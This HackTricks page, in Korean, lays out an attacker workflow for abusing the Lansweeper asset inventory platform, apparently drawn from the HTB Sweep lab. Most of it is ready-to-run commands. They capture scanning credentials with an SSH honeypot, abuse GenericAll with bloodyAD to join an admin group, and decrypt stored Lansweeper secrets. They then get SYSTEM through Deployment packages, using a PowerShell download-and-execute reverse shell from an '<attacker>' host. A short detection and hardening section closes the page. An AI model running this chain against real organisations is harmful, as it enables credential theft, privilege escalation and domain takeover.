# Lansweeper Abuse: Credential Harvesting, Secrets Decryption, and Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper는 일반적으로 Windows에 배포되고 Active Directory와 통합되는 IT asset discovery 및 inventory platform입니다. Lansweeper에 구성된 credentials는 scanning engine이 SSH, SMB/WMI 및 WinRM과 같은 protocol을 통해 asset에 인증하는 데 사용됩니다. Misconfiguration으로 인해 다음과 같은 문제가 자주 발생합니다:

- scanning target을 attacker-controlled host(honeypot)로 redirect하여 credential interception
- Lansweeper 관련 group이 노출하는 AD ACL을 악용하여 remote access 획득
- host에서 Lansweeper-configured secrets(connection strings 및 stored scanning credentials) 복호화
- Deployment feature를 통해 managed endpoint에서 code execution 수행(대개 SYSTEM으로 실행)

이 페이지에서는 engagement 중 이러한 동작을 악용하기 위한 실용적인 attacker workflow와 command를 요약합니다.

## 1) honeypot을 통한 scanning credentials 수집(SSH 예시)

아이디어: 사용자의 host를 가리키는 Scanning Target을 생성하고 기존 Scanning Credentials를 해당 target에 매핑합니다. scan이 실행되면 Lansweeper는 해당 credentials로 인증을 시도하며, 사용자의 honeypot이 이를 capture합니다.<sup>[[1]](#references)</sup>

Steps overview(web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range(또는 Single IP) = 사용자의 VPN IP
- SSH port를 접근 가능한 port로 설정(예: 22가 차단된 경우 2022)
- schedule을 비활성화하고 수동으로 trigger하도록 계획
- Scanning → Scanning Credentials → Linux/SSH creds가 존재하는지 확인하고 새 target에 매핑(enable all as needed)
- target에서 “Scan now” 클릭
- SSH honeypot을 실행하고 시도된 username/password를 가져옴

sshesame 사용 예시:<sup>[[2]](#references)</sup>
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
수집한 creds를 DC 서비스에 대해 검증:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
참고
- scanner를 listener로 유도할 수 있는 경우 다른 protocol에도 유사하게 적용됩니다(SMB/WinRM honeypot 등). SSH가 가장 간단한 경우가 많습니다.
- 많은 scanner는 고유한 client banner(예: RebexSSH)로 자신을 식별하며, 일반적으로 무해한 command(uname, whoami 등)를 실행하려고 시도합니다.

## 2) AD ACL abuse: app-admin group에 자신을 추가하여 remote access 획득

BloodHound를 사용하여 compromised account의 유효한 권한을 열거합니다. 일반적으로 scanner 또는 app 전용 group(예: “Lansweeper Discovery”)이 privileged group(예: “Lansweeper Admins”)에 대해 GenericAll을 보유한 것을 확인할 수 있습니다. privileged group이 “Remote Management Users”의 member이기도 하다면, 자신을 추가하는 즉시 WinRM을 사용할 수 있습니다.<sup>[[1]](#references)[[5]](#references)</sup>

Collection examples:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
BloodyAD(Linux)를 사용한 그룹의 GenericAll 악용:<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
그런 다음 interactive shell을 확보합니다:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
팁: Kerberos 작업은 시간에 민감합니다. KRB_AP_ERR_SKEW가 발생하면 먼저 DC와 시간을 동기화하세요:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) 호스트에서 Lansweeper-configured secrets 복호화

Lansweeper 서버에서 ASP.NET 사이트는 일반적으로 application에서 사용하는 암호화된 connection string과 symmetric key를 저장합니다. 적절한 로컬 access 권한이 있으면 DB connection string을 복호화한 다음 저장된 scanning credentials를 추출할 수 있습니다.<sup>[[1]](#references)</sup>

Typical locations:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

SharpLansweeperDecrypt를 사용하여 저장된 creds의 복호화 및 dumping을 자동화합니다:<sup>[[3]](#references)</sup>
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
예상 출력에는 DB 연결 세부 정보와 환경 전반에서 사용되는 Windows 및 Linux 계정 등의 평문 scanning 자격 증명이 포함됩니다. 이러한 계정은 도메인 호스트에서 로컬 권한이 상승되어 있는 경우가 많습니다:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
복구한 Windows scanning creds를 권한 있는 액세스에 사용:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

“Lansweeper Admins”의 멤버인 경우, 웹 UI에서 Deployment 및 Configuration에 접근할 수 있습니다. Deployment → Deployment packages에서 대상 asset에 임의의 command를 실행하는 package를 생성할 수 있습니다. 실행은 높은 권한을 가진 Lansweeper service에 의해 수행되므로, 선택한 host에서 NT AUTHORITY\SYSTEM으로 code execution이 가능합니다.<sup>[[1]](#references)</sup>

High-level steps:
- PowerShell 또는 cmd one-liner(reverse shell, add-user 등)를 실행하는 새로운 Deployment package를 생성합니다.
- 원하는 asset(예: Lansweeper가 실행 중인 DC/host)을 대상으로 지정하고 Deploy/Run now를 클릭합니다.
- SYSTEM 권한으로 shell을 수신합니다.

Example payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Deployment 작업은 시끄럽고 Lansweeper 및 Windows event logs에 로그를 남깁니다. 신중하게 사용하세요.

## Detection 및 hardening

- 익명 SMB 열거를 제한하거나 제거하세요. RID cycling 및 Lansweeper shares에 대한 비정상적인 액세스를 모니터링하세요.
- Egress controls: scanner hosts에서 outbound SSH/SMB/WinRM을 차단하거나 엄격하게 제한하세요. 비표준 포트(예: 2022) 및 Rebex와 같은 비정상적인 client banners에 대해 alert를 생성하세요.
- `Website\\web.config` 및 `Key\\Encryption.txt`를 보호하세요. secrets를 vault로 externalize하고 노출 시 rotate하세요. 가능한 경우 최소 권한을 가진 service accounts 및 gMSA 사용을 고려하세요.
- AD monitoring: Lansweeper 관련 groups(예: “Lansweeper Admins”, “Remote Management Users”)의 변경 사항과 privileged groups에 GenericAll/Write membership을 부여하는 ACL 변경 사항에 대해 alert를 생성하세요.
- Deployment package의 생성/변경/실행을 audit하세요. cmd.exe/powershell.exe를 spawning하거나 예상치 못한 outbound connections를 생성하는 packages에 대해 alert를 생성하세요.

## Related topics
- SMB/LSA/SAMR enumeration 및 RID cycling
- Kerberos password spraying 및 clock skew 고려 사항
- application-admin groups의 BloodHound path analysis
- WinRM 사용 및 lateral movement

## References
- [1] [HTB: Sweep — Lansweeper Scanning, AD ACLs, and Secrets를 악용하여 DC 장악 (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
